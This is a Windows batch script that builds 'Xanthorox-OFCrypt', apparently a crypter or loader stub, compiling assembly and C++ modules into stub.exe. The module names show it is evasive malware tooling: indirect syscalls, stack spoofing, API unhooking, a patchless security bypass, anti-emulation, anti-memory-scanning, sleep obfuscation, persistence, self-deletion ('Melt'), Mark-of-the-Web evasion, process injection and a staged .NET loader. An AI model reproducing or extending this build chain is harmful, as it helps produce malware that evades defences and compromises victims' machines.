@echo off
setlocal enabledelayedexpansion

REM ═══════════════════════════════════════════════════════════
REM  Xanthorox-OFCrypt Stub Build Script
REM  MSVC x64 Release Build with MASM assembly
REM ═══════════════════════════════════════════════════════════

REM Find VS installation
for /f "usebackq tokens=*" %%i in (`"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -latest -property installationPath`) do set VSPATH=%%i

if not defined VSPATH (
    echo ERROR: Visual Studio not found
    exit /b 1
)

echo [BUILD] VS Path: %VSPATH%

REM Set up MSVC x64 environment
call "%VSPATH%\VC\Auxiliary\Build\vcvarsall.bat" x64

if errorlevel 1 (
    echo ERROR: vcvarsall.bat failed
    exit /b 1
)

REM Re-enable delayed expansion (vcvarsall.bat resets it via setlocal/endlocal)
setlocal enabledelayedexpansion

REM Create output directory
if not exist "build\obj" mkdir build\obj
if not exist "build\out" mkdir build\out

set STUBDIR=Stub
set OBJDIR=build\obj
set OUTDIR=build\out

REM Compiler flags
set CFLAGS=/nologo /W4 /O2 /MT /GS- /Zl /DNDEBUG /D_WIN64 /EHs-c- /GR- /utf-8
set LFLAGS=/nologo /SUBSYSTEM:WINDOWS /NODEFAULTLIB /MERGE:.rdata=.text /ENTRY:WinMain
set LIBS=kernel32.lib user32.lib advapi32.lib ole32.lib ntdll.lib bcrypt.lib mscoree.lib

echo.
echo [BUILD] === Assembling MASM files ===

REM Assemble IndirectSyscall.asm
ml64.exe /c /nologo /Fo"%OBJDIR%\IndirectSyscall.obj" "%STUBDIR%\IndirectSyscall.asm"
if errorlevel 1 (
    echo ERROR: IndirectSyscall.asm assembly failed
    exit /b 1
)
echo [BUILD]   IndirectSyscall.asm -> OK

REM Assemble StackSpoof.asm (output renamed to avoid collision with StackSpoof.cpp)
ml64.exe /c /nologo /Fo"%OBJDIR%\StackSpoofAsm.obj" "%STUBDIR%\StackSpoof.asm"
if errorlevel 1 (
    echo ERROR: StackSpoof.asm assembly failed
    exit /b 1
)
echo [BUILD]   StackSpoof.asm -> OK

echo.
echo [BUILD] === Compiling C++ files ===

set CPPFILES=ApiResolver Crypto KeyDerive PureCrypto NeuroDecrypt GhostDecrypt DarknetDecrypt VoidDecrypt Telemetry PatchlessBypass KnownDlls Syscall GadgetPool Hotpatch VehDispatcher Unhook AntiEmul Phantom ThreadPool GuardPage StackSpoof TlsCallback AntiCheck GodMode Persist Melt Motw Injection DotNetLoader ThreadNormalizer SleepObf AntiMemScan StageLoader CrtStubs

set COMPILE_ERRORS=0
for %%F in (%CPPFILES%) do (
    cl.exe %CFLAGS% /c /Fo"%OBJDIR%\%%F.obj" "%STUBDIR%\%%F.cpp" 2>&1
    if errorlevel 1 (
        echo [BUILD]   %%F.cpp -> FAILED
        set /a COMPILE_ERRORS+=1
    ) else (
        echo [BUILD]   %%F.cpp -> OK
    )
)

echo.
echo [BUILD] === Compiling Entry.cpp ===
cl.exe %CFLAGS% /c /Fo"%OBJDIR%\Entry.obj" "%STUBDIR%\Entry.cpp" 2>&1
if errorlevel 1 (
    echo [BUILD]   Entry.cpp -> FAILED
    set /a COMPILE_ERRORS+=1
) else (
    echo [BUILD]   Entry.cpp -> OK
)

if %COMPILE_ERRORS% GTR 0 (
    echo.
    echo [BUILD] === %COMPILE_ERRORS% compilation errors ===
    echo Fix errors above and rebuild.
    exit /b 1
)

echo.
echo [BUILD] === Linking ===

REM Collect all object files
set OBJFILES=
for %%F in (%OBJDIR%\*.obj) do (
    set OBJFILES=!OBJFILES! %%F
)

link.exe %LFLAGS% /OUT:"%OUTDIR%\stub.exe" %OBJFILES% %LIBS%
if errorlevel 1 (
    echo ERROR: Linking failed
    exit /b 1
)

echo.
echo [BUILD] === SUCCESS ===
echo Output: %OUTDIR%\stub.exe
echo.

REM Show basic file info
dir "%OUTDIR%\stub.exe"
